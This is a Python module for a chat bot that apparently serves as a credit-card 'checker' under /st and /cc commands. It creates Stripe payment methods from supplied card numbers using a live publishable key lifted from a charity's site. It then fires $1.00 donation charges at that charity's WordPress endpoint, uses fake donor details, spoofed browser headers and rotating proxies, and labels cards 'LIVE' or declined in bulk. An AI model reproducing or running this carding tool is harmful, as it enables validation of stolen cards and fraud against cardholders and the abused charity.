"""
AutoStripe Gateway - Stripe CC Foundation Integration
Uses the working CC Foundation gateway for card checking via Stripe
Command: /st
"""

import aiohttp
import random
import uuid
import hashlib
import time
from commands.base_command import BaseCommand, CommandType

# Stripe API configuration
STRIPE_API = "https://api.stripe.com/v1/payment_methods"
DONATION_ENDPOINT = "https://ccfoundationorg.com/wp-admin/admin-ajax.php"
STRIPE_KEY = "pk_live_51IGkkVAgdYEhlUBFnXi5eN0WC8T5q7yyDOjZfj3wGc93b2MAxq0RvWwOdBdGIl7enL3Lbx27n74TTqElkVqk5fhE00rUuIY5Lp"


def generate_guid():
    """Generate a random GUID"""
    return str(uuid.uuid4())


def generate_session_id():
    """Generate a random session ID"""
    return hashlib.md5(str(time.time()).encode()).hexdigest()


def generate_form_id():
    """Generate a random form ID"""
    import string
    return ''.join(random.choices(string.hexdigits.lower(), k=13))


def generate_nonce():
    """Generate a random nonce"""
    import string
    return ''.join(random.choices(string.hexdigits.lower(), k=10))


async def create_payment_method(session, card_number, exp_month, exp_year, cvc, proxy=None):
    """
    Create a Stripe payment method
    
    Returns:
        tuple: (payment_method_id, error_message)
    """
    headers = {
        'authority': 'api.stripe.com',
        'accept': 'application/json',
        'accept-language': 'en-US,en;q=0.9',
        'content-type': 'application/x-www-form-urlencoded',
        'origin': 'https://js.stripe.com',
        'referer': 'https://js.stripe.com/',
        'sec-ch-ua': '"Chromium";v="137", "Not/A)Brand";v="24"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Linux"',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'same-site',
        'user-agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Safari/537.36',
    }
    
    guid = generate_guid()
    muid = generate_guid()
    sid = generate_guid()
    
    # Use URL-encoded format like the working gateway
    data = (
        f'type=card'
        f'&billing_details[name]=John+Doe'
        f'&billing_details[email]=test{random.randint(1000,9999)}@gmail.com'
        f'&billing_details[address][line1]=123+Main+Street'
        f'&billing_details[address][postal_code]=10080'
        f'&card[number]={card_number}'
        f'&card[cvc]={cvc}'
        f'&card[exp_month]={exp_month}'
        f'&card[exp_year]={exp_year}'
        f'&guid={guid}'
        f'&muid={muid}'
        f'&sid={sid}'
        f'&payment_user_agent=stripe.js%2F014aea9fff%3B+stripe-js-v3%2F014aea9fff%3B+card-element'
        f'&referrer=https%3A%2F%2Fccfoundationorg.com'
        f'&time_on_page={random.randint(50000, 100000)}'
        f'&key={STRIPE_KEY}'
    )
    
    try:
        async with session.post(
            STRIPE_API,
            headers=headers,
            data=data,
            proxy=proxy,
            timeout=aiohttp.ClientTimeout(total=30)
        ) as resp:
            result = await resp.json()
            
            if 'id' in result:
                return result['id'], None
            elif 'error' in result:
                error = result['error']
                error_code = error.get('code', '')
                error_message = error.get('message', 'Unknown error')
                return None, f"{error_code}: {error_message}"
            else:
                return None, "Unknown response"
                
    except Exception as e:
        return None, f"Request error: {str(e)[:50]}"


async def submit_donation(session, payment_method_id, proxy=None):
    """
    Submit donation to CC Foundation
    
    Returns:
        tuple: (success, message)
    """
    headers = {
        'authority': 'ccfoundationorg.com',
        'accept': '*/*',
        'accept-language': 'en-US,en;q=0.9',
        'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
        'origin': 'https://ccfoundationorg.com',
        'referer': 'https://ccfoundationorg.com/donate/',
        'user-agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Safari/537.36',
        'x-requested-with': 'XMLHttpRequest',
    }
    
    form_id = generate_form_id()
    nonce = generate_nonce()
    
    data = {
        'action': 'give_process_donation',
        'give-form-id': '1234',
        'give-form-title': 'Donation Form',
        'give-form-hash': form_id,
        'give-price-id': '1',
        'give-amount': '1.00',
        'give-recurring-period': 'month',
        'give_first': 'John',
        'give_last': 'Doe',
        'give_email': f'donor{random.randint(100,999)}@gmail.com',
        'give-payment-method-id': payment_method_id,
        'give_action': 'purchase',
        'give-gateway': 'stripe',
        '_wpnonce': nonce,
    }
    
    try:
        async with session.post(
            DONATION_ENDPOINT,
            headers=headers,
            data=data,
            proxy=proxy,
            timeout=aiohttp.ClientTimeout(total=30)
        ) as resp:
            text = await resp.text()
            
            # Parse response
            if 'success' in text.lower() or 'thank' in text.lower():
                return True, "Charged $1.00"
            elif 'insufficient_funds' in text.lower():
                return True, "Insufficient Funds - LIVE"
            elif 'incorrect_cvc' in text.lower() or 'invalid_cvc' in text.lower():
                return True, "CVV Error - LIVE"
            elif 'expired_card' in text.lower():
                return False, "Expired Card"
            elif 'card_declined' in text.lower() or 'generic_decline' in text.lower():
                return False, "Card Declined"
            elif 'do_not_honor' in text.lower():
                return False, "Do Not Honor"
            elif 'lost_card' in text.lower() or 'stolen_card' in text.lower():
                return False, "Lost/Stolen Card"
            elif 'pickup_card' in text.lower():
                return False, "Pickup Card"
            elif 'restricted_card' in text.lower():
                return False, "Restricted Card"
            elif 'transaction_not_allowed' in text.lower():
                return False, "Transaction Not Allowed"
            elif 'invalid_account' in text.lower():
                return False, "Invalid Account"
            elif 'incorrect_number' in text.lower():
                return False, "Incorrect Number"
            elif 'processing_error' in text.lower():
                return False, "Processing Error"
            elif 'rate_limit' in text.lower():
                return False, "Rate Limited - Try Later"
            else:
                # Try to extract error message
                if 'error' in text.lower():
                    return False, "Card Declined"
                return False, "Unknown Response"
                
    except Exception as e:
        return False, f"Request error: {str(e)[:50]}"


async def process_card(cc, mes, ano, cvv, site=None, proxies=None):
    """
    Process a card through Stripe CC Foundation gateway
    
    Args:
        cc: Card number
        mes: Expiry month (MM)
        ano: Expiry year (YY or YYYY)
        cvv: CVV code
        site: Not used for Stripe (kept for compatibility)
        proxies: Optional proxy list
    
    Returns:
        tuple: (success, message) or (success, message, gateway)
    """
    gateway_name = "CC Foundation"
    
    # Get proxy if available
    proxy_str = None
    if proxies:
        proxy = random.choice(proxies) if isinstance(proxies, list) else proxies
        if hasattr(proxy, 'proxy'):
            proxy_str = f"http://{proxy.proxy}"
        elif isinstance(proxy, str):
            proxy_str = f"http://{proxy}" if not proxy.startswith('http') else proxy
    
    # Normalize year
    if len(ano) == 2:
        exp_year = f"20{ano}"
    else:
        exp_year = ano
    
    try:
        connector = aiohttp.TCPConnector(ssl=False)
        async with aiohttp.ClientSession(connector=connector) as session:
            # Step 1: Create payment method
            pm_id, error = await create_payment_method(
                session, cc, mes, exp_year, cvv, proxy_str
            )
            
            if error:
                # Parse Stripe errors
                error_lower = error.lower()
                
                if 'incorrect_number' in error_lower:
                    return False, "Incorrect Card Number", gateway_name
                elif 'invalid_expiry' in error_lower or 'exp_' in error_lower:
                    return False, "Invalid Expiry Date", gateway_name
                elif 'invalid_cvc' in error_lower:
                    return False, "Invalid CVV", gateway_name
                elif 'card_declined' in error_lower:
                    return False, "Card Declined", gateway_name
                elif 'expired_card' in error_lower:
                    return False, "Expired Card", gateway_name
                elif 'processing_error' in error_lower:
                    return False, "Processing Error", gateway_name
                elif 'rate_limit' in error_lower:
                    return False, "Rate Limited", gateway_name
                else:
                    return False, error[:50], gateway_name
            
            if not pm_id:
                return False, "Failed to create payment method", gateway_name
            
            # Step 2: Submit donation
            success, message = await submit_donation(session, pm_id, proxy_str)
            
            return success, message, gateway_name
            
    except Exception as e:
        return False, f"Error: {str(e)[:50]}", gateway_name


async def register_stripe_gateway(bot):
    """Register the Stripe gateway command"""
    base_command = BaseCommand(
        bot=bot,
        name="Stripe",
        cmd="st",
        handler=process_card,
        cmd_type=CommandType.MASS,
        premium=False,
        amount='$1.00',
        status=True
    )
    base_command.register_command()


# Also register as /cc for compatibility
async def register_cc_gateway(bot):
    """Register the CC gateway command (alias for Stripe)"""
    base_command = BaseCommand(
        bot=bot,
        name="CC Foundation",
        cmd="cc",
        handler=process_card,
        cmd_type=CommandType.CHARGE,
        premium=False,
        amount=1.00,
        amountType='$',
        status=True
    )
    base_command.register_command()
